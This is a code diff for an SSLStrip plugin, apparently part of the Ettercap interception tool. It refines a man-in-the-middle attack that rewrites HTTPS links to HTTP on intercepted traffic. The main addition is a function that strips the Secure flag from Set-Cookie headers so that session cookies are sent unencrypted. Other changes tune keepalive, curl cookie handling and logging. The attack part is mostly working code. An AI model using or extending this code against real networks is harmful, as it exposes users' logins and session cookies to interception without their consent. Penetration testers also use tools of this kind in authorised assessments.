@@ -120,7 +120,6 @@ struct http_connection {
 	struct http_request *request;
 	struct http_response *response;
 	char curl_err_buffer[CURL_ERROR_SIZE];
-	LIST_HEAD(, https_link) links;
 	#define HTTP_CLIENT 0
 	#define HTTP_SERVER 1
 };
@@ -139,7 +138,6 @@ static regex_t *find_https_re = NULL;
 
 
 /* protos */
-void https_void(void);
 int plugin_load(void *);
 static int sslstrip_init(void *);
 static int sslstrip_fini(void *);
@@ -170,6 +168,7 @@ static void http_wipe_connection(struct http_connection *connection);
 static void http_handle_request(struct http_connection *connection, struct packet_object *po);
 static void http_send(struct http_connection *connection, struct packet_object *po, int proto);
 static void http_remove_https(struct http_connection *connection);
+static void http_remove_secure_from_cookie(struct http_connection *connection);
 static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void *userdata);
 //static size_t http_write_to_server(void *ptr, size_t size, size_t nmemb, void *stream);
 
@@ -208,7 +207,7 @@ static int sslstrip_init(void *dummy)
 	 * Add IPTables redirect for port 80
          */
 	if (http_bind_wrapper() != ESUCCESS) {
-		USER_MSG("SSLStrip: Could not set up HTTP redirect\n");
+		ERROR_MSG("SSLStrip: Could not set up HTTP redirect\n");
 		return PLUGIN_FINISHED;
 	}
 	
@@ -226,7 +225,7 @@ static int sslstrip_fini(void *dummy)
 
 	DEBUG_MSG("SSLStrip: Removing redirect\n");
 	if (http_remove_redirect(bind_port) == -EFATAL) {
-		USER_MSG("Unable to remove HTTP redirect, please do so manually.");
+		ERROR_MSG("Unable to remove HTTP redirect, please do so manually.");
 	}
 
        /* stop accept wrapper */
@@ -323,6 +322,10 @@ static void sslstrip(struct packet_object *po)
 		memcpy(s->data, &po->L3.dst, sizeof(struct ip_addr));
 		session_put(s);
 	} else {
+		po->flags |= PO_IGNORE;
+	}
+#else
+	if (!(po->L4.flags & TH_PSH)) {
 		po->flags |= PO_IGNORE;
 	}
 #endif
@@ -490,6 +493,8 @@ static EC_THREAD_FUNC(http_accept_thread)
 	struct http_connection *connection;
 	u_int len = sizeof(struct sockaddr_in);
 	struct sockaddr_in client_sin;
+	int optval = 1;
+	socklen_t optlen = sizeof(optval);
 
 	ec_thread_init();
 
@@ -526,6 +531,10 @@ static EC_THREAD_FUNC(http_accept_thread)
 			connection->port[HTTP_SERVER] = htons(80);
 			//connection->request->len = 0;
 
+			/* set SO_KEEPALIVE */
+			if (setsockopt(connection->fd, SOL_SOCKET, SO_KEEPALIVE, &optval, optlen) < 0) {
+				DEBUG_MSG("SSLStrip: Could not set up SO_KEEPALIVE");
+			}
 			/* create detached thread */
 			ec_thread_new_detached("http_child_thread", "http child", &http_child_thread, connection, 1);	
 		}
@@ -634,7 +643,7 @@ static void http_handle_request(struct http_connection *connection, struct packe
 {
 	struct https_link *link;
 
-	SAFE_CALLOC(connection->request->url, 1, 1024);
+	SAFE_CALLOC(connection->request->url, 1, 512);
 
 	if (connection->request->url==NULL)
 		return;
@@ -665,6 +674,8 @@ static void http_handle_request(struct http_connection *connection, struct packe
 	BUG_IF(body==NULL);
 
 	char *end_header = strstr(h, "\r\n\r\n");
+
+	if (!end_header) return; //Something went really wrong here
 	*end_header = '\0';
 
 	char *header;
@@ -693,6 +704,7 @@ static void http_handle_request(struct http_connection *connection, struct packe
 
 	LIST_LOCK;
 	LIST_FOREACH(link, &https_links, next) {
+		DEBUG_MSG("SSLStrip: Comparing %s with %s", link->url, connection->request->url);
 		if (!strcmp(link->url, connection->request->url)) {
 			proto = PROTO_HTTPS;
 			break;
@@ -717,10 +729,11 @@ static void http_handle_request(struct http_connection *connection, struct packe
 static void http_send(struct http_connection *connection, struct packet_object *po, int proto)
 {
 
+	curl_global_init(CURL_GLOBAL_ALL);
 	connection->handle = curl_easy_init();
 
 	if(!connection->handle) {
-		USER_MSG("SSLStrip: Not enough memory to allocate CURL handle");
+		DEBUG_MSG("SSLStrip: Not enough memory to allocate CURL handle");
 		return;
 	}
 
@@ -740,7 +753,7 @@ static void http_send(struct http_connection *connection, struct packet_object *
 
 
 	if (url==NULL) {
-		USER_MSG("Not enough memory to allocate for URL %s\n", connection->request->url);
+		DEBUG_MSG("Not enough memory to allocate for URL %s\n", connection->request->url);
 		return;
 	}	
 
@@ -750,19 +763,14 @@ static void http_send(struct http_connection *connection, struct packet_object *
 	curl_easy_setopt(connection->handle, CURLOPT_WRITEFUNCTION, http_receive_from_server);
 	curl_easy_setopt(connection->handle, CURLOPT_WRITEDATA, connection);
 	curl_easy_setopt(connection->handle, CURLOPT_ERRORBUFFER, connection->curl_err_buffer);
-	//curl_easy_setopt(connection->handle, CURLOPT_READFUNCTION, http_write_to_server);
-	//curl_easy_setopt(connection->handle, CURLOPT_READDATA, &po);
-	//curl_easy_setopt(connection->handle, CURLOPT_INFILESIZE_LARGE, (curl_off_t)po->DATA.len);
 	curl_easy_setopt(connection->handle, CURLOPT_HEADER, 1L);
 	curl_easy_setopt(connection->handle, CURLOPT_HTTPHEADER, connection->request->headers);
 	curl_easy_setopt(connection->handle, CURLOPT_ACCEPT_ENCODING, "gzip");
 	curl_easy_setopt(connection->handle, CURLOPT_ACCEPT_ENCODING, "deflate");
-	//curl_easy_setopt(connection->handle, CURLOPT_WRITEHEADER, connection);
+	curl_easy_setopt(connection->handle, CURLOPT_COOKIEFILE, ""); //Initialize cookie engine
 
 
 	if(connection->request->method == HTTP_POST) {
-		DEBUG_MSG("SSLStrip: Adding POST data");
-		DEBUG_MSG("SSLStrip: POST PAYLOAD %s", connection->request->payload);
 		curl_easy_setopt(connection->handle, CURLOPT_POST, 1L);
 		curl_easy_setopt(connection->handle, CURLOPT_POSTFIELDS, connection->request->payload);
 		curl_easy_setopt(connection->handle, CURLOPT_POSTFIELDSIZE, strlen(connection->request->payload));
@@ -771,18 +779,21 @@ static void http_send(struct http_connection *connection, struct packet_object *
 	DEBUG_MSG("SSLStrip: Performing CURL action");
 
 	if(curl_easy_perform(connection->handle) != CURLE_OK) {
-		USER_MSG("Unable to send request to HTTP server: %s\n", connection->curl_err_buffer);
+		DEBUG_MSG("Unable to send request to HTTP server: %s\n", connection->curl_err_buffer);
 		return;
 	} else {
 		DEBUG_MSG("SSLStrip: Sent request to server");
 	}
 
 	DEBUG_MSG("SSLStrip: Removing HTTPS");
-
+	//DEBUG_MSG("Before removing HTTPS: %s", connection->response->html);
 	http_remove_https(connection);
+	//DEBUG_MSG("After remove HTTPS: %s", connection->response->html);
+	http_remove_secure_from_cookie(connection);
+	//DEBUG_MSG("After removing secure from cookies: %s", connection->response->html);
 
-	if(strstr(connection->response->html, "Content-Encoding:") ||
-	   strstr(connection->response->html, "Transfer-Encoding:")) {
+	if(strstr(connection->response->html, "\r\nContent-Encoding:") ||
+	   strstr(connection->response->html, "\r\nTransfer-Encoding:")) {
 		http_remove_header("Content-Encoding", connection);
 		http_remove_header("Transfer-Encoding", connection);
 		http_update_content_length(connection);
@@ -792,19 +803,17 @@ static void http_send(struct http_connection *connection, struct packet_object *
 	//Send result back to client
 	DEBUG_MSG("SSLStrip: Sending response back to client");
 	if (http_write(connection->fd, connection->response->html, connection->response->len) != ESUCCESS){
-		USER_MSG("Unable to send HTTP response back to client\n");
+		DEBUG_MSG("Unable to send HTTP response back to client\n");
 	} else {
 		DEBUG_MSG("Sent HTTP response back to client");
 	}
 
 
 	//Allow decoders to run on HTTP response
-	packet_destroy_object(po);
 	http_initialize_po(po, connection->response->html, connection->response->len);
-
+	packet_destroy_object(po);
    	po->len = po->DATA.len;
    	po->L4.flags |= TH_PSH;
-
 	packet_disp_data(po, po->DATA.data, po->DATA.len);
 
 	DEBUG_MSG("SSLStrip: Calling parser for response");
@@ -827,6 +836,7 @@ static void http_send(struct http_connection *connection, struct packet_object *
 
 	if(connection->handle) {
 		curl_easy_cleanup(connection->handle);
+		curl_global_cleanup();
 		connection->handle = NULL;
 	}
 
@@ -968,7 +978,6 @@ EC_THREAD_FUNC(http_child_thread)
 
         		DEBUG_MSG("SSLStrip: Calling parser for request");
         		http_parse_packet(connection, HTTP_CLIENT, &po);
-
 			http_handle_request(connection, &po);
 		}
 		
@@ -1029,6 +1038,7 @@ static void http_remove_https(struct http_connection *connection)
 			SAFE_CALLOC(l->url, 1, strlen(host)+1+strlen(path)+1);
 			BUG_IF(l->url==NULL);
 			sprintf(l->url, "%s/%s", host, path);
+			Decode_Url((u_char *)l->url);
 			l->last_used = time(NULL);
 		
 			//Add to list	
@@ -1074,6 +1084,9 @@ static void http_remove_https(struct http_connection *connection)
 		SAFE_FREE(connection->response->html);	
 		connection->response->html = new_html;
 		connection->response->len = new_len;	
+	} else {
+		/* Thanks but we don't need it */
+		SAFE_FREE(new_html);
 	}
 
         /* Iterate through all http_request and remove any that have not been used lately */
@@ -1123,6 +1136,8 @@ static void http_parse_packet(struct http_connection *connection, int direction,
 	}
 
 	/* let's start fromt he last stage of decoder chain */
+
+	DEBUG_MSG("SSLStrip: Parsing %s", po->DATA.data);
 	start_decoder = get_decoder(APP_LAYER, PL_DEFAULT);
 	start_decoder(po->DATA.data, po->DATA.len, &len, po);
 }
@@ -1218,82 +1233,8 @@ static void http_wipe_connection(struct http_connection *connection)
 		SAFE_FREE(connection);
 }
 
-#if 0
-static int http_connect_real_server(struct http_connection *connection, struct packet_object *po) {
-	int fd;
-
-	char *dest_ip = strdup(int_ntoa(ip_addr_to_int32(connection->ip[HTTP_SERVER].addr)));
-	if (!dest_ip)
-		return -EINVALID;
-
-	if((fd = open_socket(dest_ip, 80)) < 0) {
-		USER_MSG("SSLStrip: Could not connect to HTTP server\n");
-		return -EINVALID;
-	}
-
-	set_blocking(fd, 0);
-
-
-	if (http_write(fd, po->DATA.data, po->DATA.len) == -EINVALID) {
-		USER_MSG("SSLStrip: Could not send request to HTTP server\n");
-		close_socket(fd);
-		return -EINVALID;
-	}
-			
-
-	//Read response and send back to client
-	char *response;
-	SAFE_CALLOC(response, 1, HTTP_MAX);
-
-	BUG_IF(response == NULL);
-
-	int len = 0;
-
-	http_initialize_po(po, NULL, 0); //Reset po
-
-/*
-                SAFE_CALLOC(b, 1, connection->response->len+(size*nmemb));
-                BUG_IF(b == NULL);
-
-                memcpy(b, connection->response->html, connection->response->len);
-                memcpy(b+connection->response->len, ptr, size*nmemb);
-                connection->response->html = b;
-
-*/
-	while(len>0) {
-		len = read(fd, response, HTTP_MAX);
-		char *b;
-		SAFE_CALLOC(b, 1, po->DATA.len+len);
-		BUG_IF(b==NULL);
-
-		memcpy(b, po->DATA.data, po->DATA.len);
-		memcpy(b+po->DATA.len, response, len);
-		po->DATA.len += len;
-		http_initialize_po(po, response, len);
-	}
-
-	DEBUG_MSG("SSLStrip: Connect real server response: %s", po->DATA.data);
-	http_parse_packet(connection, HTTP_SERVER, po);
-
-	if (http_write(connection->fd, po->DATA.data, po->DATA.len) == -EINVALID) {
-		USER_MSG("SSLStrip: Could not send HTTP response back to client\n");
-		SAFE_FREE(response);
-		http_initialize_po(po, NULL, 0);
-		close_socket(fd);
-		return -EINVALID;
-	}
-	
-
-	SAFE_FREE(response);
-	http_initialize_po(po, NULL, 0);
-
-	close_socket(fd);	
-
-	return ESUCCESS;
-}
-#endif
-
 void http_remove_header(char *header, struct http_connection *connection) {
+	DEBUG_MSG("SSLStrip: http_remove_header");
 	if (strstr(connection->response->html, header)) {
         	char *r = strdup(connection->response->html);
         	size_t len = strlen(connection->response->html);
@@ -1320,6 +1261,53 @@ void http_remove_header(char *header, struct http_connection *connection) {
         }
 }
 
+void http_remove_secure_from_cookie(struct http_connection *connection) {
+	if (!strstr(connection->response->html, "Set-Cookie")) {
+		return;
+	}
+	
+	size_t newlen = 0;
+	size_t pos = 0;
+	char *buf_cpy = connection->response->html;
+	char *new_html;
+	char *cookie_pattern = "Set-Cookie: (.*?;)(.?Secure;|.?Secure)(.*?)\r\n";
+
+	SAFE_CALLOC(new_html, 1, connection->response->len);
+	char changed = 0;
+
+	regex_t find_cookie_re;
+	if(regcomp(&find_cookie_re, cookie_pattern, REG_EXTENDED | REG_NEWLINE | REG_ICASE)) {
+		ERROR_MSG("SSLStrip: Could not compile find_cookie regex");
+		return;
+	}
+
+	regmatch_t match[4];
+
+	while(!regexec(&find_cookie_re, buf_cpy, 4, match, REG_NOTBOL)) {
+		memcpy(new_html+newlen, buf_cpy, match[1].rm_eo);
+		newlen += match[1].rm_eo;
+		
+		memcpy(new_html+newlen, buf_cpy+match[3].rm_so, match[3].rm_eo - match[3].rm_so);
+		newlen += match[3].rm_eo - match[3].rm_so;
+		
+		buf_cpy += match[0].rm_eo-2;
+		pos += match[0].rm_eo-2;
+		changed=1;
+	}
+
+	if (changed) {
+		memcpy(new_html+newlen, buf_cpy, connection->response->len - pos);
+		newlen += connection->response->len - pos;
+
+		SAFE_FREE(connection->response->html);
+
+		connection->response->html = new_html;
+		connection->response->len = newlen;
+	} else {
+		SAFE_FREE(new_html);
+	}
+}
+
 void http_update_content_length(struct http_connection *connection) {
 	if (strstr(connection->response->html, "Content-Length: ")) {
         	char *buf = connection->response->html;
@@ -1334,8 +1322,6 @@ void http_update_content_length(struct http_connection *connection) {
         }
 }
 
-void https_void (void) {
-}
 #endif /* HAVE_LIBCURL */
 
 // vim:ts=3:expandtab
